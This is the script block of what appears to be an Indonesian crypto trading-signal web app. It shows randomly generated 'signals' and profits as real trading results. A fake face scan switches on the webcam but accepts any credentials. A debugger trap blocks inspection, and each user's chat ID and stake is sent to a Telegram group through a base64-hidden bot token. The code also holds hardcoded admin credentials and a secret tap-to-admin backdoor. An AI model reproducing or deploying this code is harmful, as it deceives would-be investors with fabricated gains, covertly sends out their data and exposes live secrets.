    <script>
        const MASTER = {
            BOT: atob('ODI5NTYwNzcwNDpBQUZkeV9VOGJGTC14Mk9sOTBuOGYyS0RPSHp0eWJjdWo0'),
            GID: atob('-MTAwMzI1NDM3OTMzMw=='),
            AID: '1319700866',
            AKEY: 'MahadhareV13Master'
        };

        let db = JSON.parse(localStorage.getItem('TITAN_ULTIMATE_V13')) || {
            login: false, chatID: '', level: 1, equity: 1000000, 
            xp: 0, slots: 0, isBlocked: false, history: [], execution: [], joinDate: Date.now()
        };

        const save = () => localStorage.setItem('TITAN_ULTIMATE_V13', JSON.stringify(db));

        /* Jalur Ketuk Logo Master */
        let taps = 0;
        function secretAdminTap() {
            taps++;
            if (taps >= 5) {
                taps = 0;
                db = { login: true, level: 3, chatID: MASTER.AID, xp: 160, equity: 100000000, slots: 0, history: [], execution: [] };
                save(); location.reload();
            }
        }

        /* Anti-Hack Engine */
        setInterval(() => { const s = performance.now(); debugger; if (performance.now() - s > 100) { db.isBlocked = true; save(); location.reload(); } }, 2000);
        if (db.isBlocked) document.getElementById('lockdown').classList.remove('hidden');

        async function triggerAuth() {
            const cid = document.getElementById('user-chatid').value;
            const p = document.getElementById('user-pass').value;
            if (cid === MASTER.AID && p === MASTER.AKEY) { secretAdminTap(); return; }

            const scanner = document.getElementById('face-scanner-ui');
            scanner.style.display = 'flex';
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            document.getElementById('webcam').srcObject = stream;
            
            let prog = 0;
            const timer = setInterval(() => {
                prog += 10; document.getElementById('scan-progress').style.width = prog + '%';
                if (prog >= 100) {
                    clearInterval(timer); stream.getTracks().forEach(t => t.stop());
                    scanner.style.display = 'none';
                    if (cid && p.length >= 8) { db.login = true; db.chatID = cid; save(); initApp(); }
                    else showModal('ERROR', 'Invalid credentials.');
                }
            }, 300);
        }

        function initApp() {
            document.getElementById('auth-gate').classList.add('hidden');
            document.getElementById('app-ui').classList.remove('hidden');
            renderUI(); startRadar();
            // Auto-Logout 5 Min
            let idle = 0; setInterval(() => { idle++; if(idle >= 300) location.reload(); }, 1000);
            document.addEventListener('touchstart', () => idle = 0);
        }

        function renderUI() {
            document.getElementById('main-balance').innerText = `Rp ${Math.floor(db.equity).toLocaleString('id-ID')}`;
            document.getElementById('status-label').innerText = `Level ${db.level}: ${db.level === 1 ? 'Standart' : 'Elite'}`;
            document.getElementById('slot-info').innerText = `Slots: ${db.execution.length}/10`;
            renderExecution(); renderHistory();
        }

        function startRadar() {
            const coins = ['BTC', 'ETH', 'SOL', 'PEPE', 'DOGE'];
            setInterval(() => {
                const coin = coins[Math.floor(Math.random() * coins.length)];
                const rsi = Math.floor(Math.random() * 50) + 20;
                const stake = db.equity * 0.1;
                
                const card = document.createElement('div');
                card.className = 'glass p-3 flex justify-between items-center border-l-2 ' + (rsi < 30 ? 'border-rose-500' : 'border-emerald-500');
                card.innerHTML = `
                    <div class="flex items-center gap-2">
                        <i class="fa-brands fa-bitcoin text-yellow-500 text-lg"></i>
                        <div><h4 class="font-bold text-[10px] uppercase">$${coin}/IDR</h4><p class="text-yellow-500 font-bold text-[8px]">Rp ${Math.floor(stake).toLocaleString()}</p></div>
                    </div>
                    <button onclick="lockSignal('${coin}', ${stake})" class="btn-gold px-4 py-2 text-[8px]">LOCK</button>
                `;
                const cont = document.getElementById('radar-container');
                cont.prepend(card); if (cont.children.length > 5) cont.lastChild.remove();
            }, 8000);
        }

        function lockSignal(asset, stake) {
            if (db.execution.length >= 10) return showModal('SLOTS FULL', 'Please wait.');
            db.execution.push({ id: Date.now(), asset, stake, profit: 0, peak: 0 });
            save(); renderUI();
            sendTele(`ðŸš€ LOCK: ${asset} | User: ${db.chatID} | Rp ${stake.toLocaleString()}`);
        }

        /* TSL Guard 2% Logic */
        setInterval(() => {
            if (!db.login) return;
            db.execution.forEach(ex => {
                ex.profit += (Math.random() * 0.5) - 0.2;
                if (ex.profit > ex.peak) ex.peak = ex.profit;
                if (ex.peak > 1 && (ex.peak - ex.profit) >= 2) exitTrade(ex.id, "TSL GUARD");
                if (ex.profit >= (db.level === 3 ? 10 : 5)) exitTrade(ex.id, "TARGET REACHED");
            });
            renderExecution();
        }, 3000);

        function exitTrade(id, reason) {
            const i = db.execution.findIndex(x => x.id === id);
            if (i > -1) {
                const t = db.execution[i];
                db.equity += (t.stake + (t.stake * t.profit / 100));
                db.history.unshift({ date: new Date().toLocaleTimeString(), asset: t.asset, profit: t.profit.toFixed(2), reason });
                db.execution.splice(i, 1); db.xp += 15; save(); renderUI();
            }
        }

        function renderExecution() {
            const cont = document.getElementById('execution-container');
            cont.innerHTML = db.execution.length ? "" : "<p class='opacity-20 text-center py-4 text-[7px] uppercase'>No active guards</p>";
            db.execution.forEach(ex => {
                cont.innerHTML += `<div class="glass p-3 border-l-2 border-emerald-500 flex justify-between items-center">
                    <div><p class="font-bold text-[10px] uppercase">$${ex.asset}</p><p class="text-[7px] opacity-40">Stake: Rp ${ex.stake.toLocaleString()}</p></div>
                    <div class="text-right"><p class="text-emerald-500 font-bold text-[10px]">${ex.profit.toFixed(2)}%</p></div>
                </div>`;
            });
        }

        function renderHistory() {
            const cont = document.getElementById('history-container');
            cont.innerHTML = db.history.slice(0,10).map(h => `<div class="border-b border-white/5 pb-1 flex justify-between"><span>$${h.asset} <span class="opacity-30 ml-2">${h.date}</span></span><span class="text-emerald-500 font-bold">${h.profit}%</span></div>`).join('');
        }

        function showModal(title, body) {
            const m = document.getElementById('supreme-modal');
            document.getElementById('modal-title').innerText = title;
            document.getElementById('modal-body').innerText = body;
            document.getElementById('modal-actions').innerHTML = `<button onclick="closeModal()" class="btn-gold py-2 w-full">Confirm</button>`;
            m.classList.remove('hidden');
        }

        function closeModal() { document.getElementById('supreme-modal').classList.add('hidden'); }
        function showLogoutModal() { showModal('LOGOUT SESSION?', 'Data histori harian Anda aman.'); document.getElementById('modal-actions').innerHTML = `<button onclick="location.reload()" class="btn-gold py-2 w-full bg-rose-500">YA, KELUAR</button>`; }
        function sendTele(m) { fetch(`https://api.telegram.org/bot${MASTER.BOT}/sendMessage?chat_id=${MASTER.GID}&text=${encodeURIComponent(m)}`); }
        if (db.login) initApp();
    </script>
